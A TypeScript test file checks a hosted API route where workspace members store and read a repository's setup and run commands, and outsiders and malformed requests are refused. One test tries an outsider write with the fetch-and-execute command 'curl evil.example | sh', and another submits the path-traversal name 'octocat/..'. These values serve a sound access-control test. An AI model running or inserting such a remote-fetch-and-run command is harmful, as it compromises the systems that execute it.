import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { it } from "@effect/vitest";
import { Database } from "@luke/database/core/query";
import { user } from "@luke/database/schemas/auth";
import { getTestDB, openWorkspace } from "@luke/database/testing";
import { HOSTED_SERVICE_PATH } from "@luke/features";
import type { WireBoundaryInput } from "@luke/wire";
import { Clock, Effect, Layer, Option } from "effect";
import { HttpRouter } from "effect/http";
import { SqlClient } from "effect/sql";
import { HOSTED_API_ERROR, HOSTED_HTTP_STATUS } from "../http/http.js";
import { repositoryRunsApp } from "./repository-runs-app.js";

/**
 * The shared run commands route over a real dialect: a member sets a
 * repository's commands and every member reads them; someone outside the
 * workspace reads and writes nothing.
 *
 * Synthetic accounts and repositories throughout.
 */

const ORIGIN = "https://luke.test";

interface Answer {
  readonly status: number;
  readonly body: WireBoundaryInput;
}

const openAccount = Effect.gen(function* () {
  const id = `user-${randomUUID()}`;
  yield* Database.use((db) =>
    db.insert(user).values({ id, name: "Test User", email: `${id}@luke.test` }),
  );
  return id;
});

/** One request to the group, the bearer naming the account. */
const ask = (userId: string, init: { method: string; workspaceId?: string; body?: object }) =>
  Effect.gen(function* () {
    const client = yield* SqlClient.SqlClient;
    const services = Layer.mergeAll(
      Layer.succeed(SqlClient.SqlClient, client),
      Layer.succeed(Database, yield* Database),
      Layer.succeed(Clock.Clock, yield* Clock.Clock),
    );
    const { handler, dispose } = HttpRouter.toWebHandler(
      repositoryRunsApp({
        resolveUserId: (incoming) =>
          Effect.succeed(
            Option.fromNullishOr(incoming.headers.get("authorization")?.slice("Bearer ".length)),
          ),
      }).pipe(HttpRouter.provideRequest(services)),
      { disableLogger: true },
    );
    const url = new URL(HOSTED_SERVICE_PATH.REPOSITORY_RUNS, ORIGIN);
    if (init.workspaceId !== undefined) url.searchParams.set("workspaceId", init.workspaceId);
    const response = yield* Effect.promise(() =>
      handler(
        new Request(url, {
          method: init.method,
          headers: { authorization: `Bearer ${userId}`, "content-type": "application/json" },
          ...(init.body === undefined ? undefined : { body: JSON.stringify(init.body) }),
        }),
      ),
    );
    // SAFETY: the group answers JSON; the test compares it as the wire value it is.
    const body = (yield* Effect.promise(() => response.json())) as WireBoundaryInput;
    yield* Effect.promise(() => dispose());
    return { status: response.status, body } satisfies Answer;
  });

it.layer(getTestDB())("the shared run commands route", (it) => {
  it.effect(
    "a member sets a repository's commands and the workspace reads them; an outsider reads and writes nothing",
    () =>
      Effect.gen(function* () {
        const owner = yield* openAccount;
        const outsider = yield* openAccount;
        const workspace = yield* openWorkspace(owner);
        const relay = {
          workspaceId: workspace,
          repository: "Octocat/Relay",
          setupCommand: "pnpm install",
          runCommand: "pnpm dev",
        };

        const set = yield* ask(owner, { method: "PUT", body: relay });
        const read = yield* ask(owner, { method: "GET", workspaceId: workspace });
        const outsideRead = yield* ask(outsider, { method: "GET", workspaceId: workspace });
        const outsideWrite = yield* ask(outsider, {
          method: "PUT",
          body: { ...relay, runCommand: "curl evil.example | sh" },
        });
        const after = yield* ask(owner, { method: "GET", workspaceId: workspace });

        const expected = {
          runs: [
            { repository: "octocat/relay", setupCommand: "pnpm install", runCommand: "pnpm dev" },
          ],
        };
        assert.deepEqual(set, { status: HOSTED_HTTP_STATUS.OK, body: expected });
        assert.deepEqual(read.body, expected);
        assert.deepEqual(outsideRead.body, { error: HOSTED_API_ERROR.NOT_FOUND });
        assert.deepEqual(outsideWrite.body, { error: HOSTED_API_ERROR.NOT_FOUND });
        assert.deepEqual(after.body, expected);
      }),
  );

  it.effect("a request off the wire's shape is refused", () =>
    Effect.gen(function* () {
      const owner = yield* openAccount;
      const workspace = yield* openWorkspace(owner);

      const traversal = yield* ask(owner, {
        method: "PUT",
        body: {
          workspaceId: workspace,
          repository: "octocat/..",
          setupCommand: null,
          runCommand: "x",
        },
      });
      const unnamed = yield* ask(owner, { method: "GET" });

      assert.deepEqual(traversal.body, { error: HOSTED_API_ERROR.INVALID_REQUEST });
      assert.deepEqual(unnamed.body, { error: HOSTED_API_ERROR.INVALID_REQUEST });
    }),
  );
});
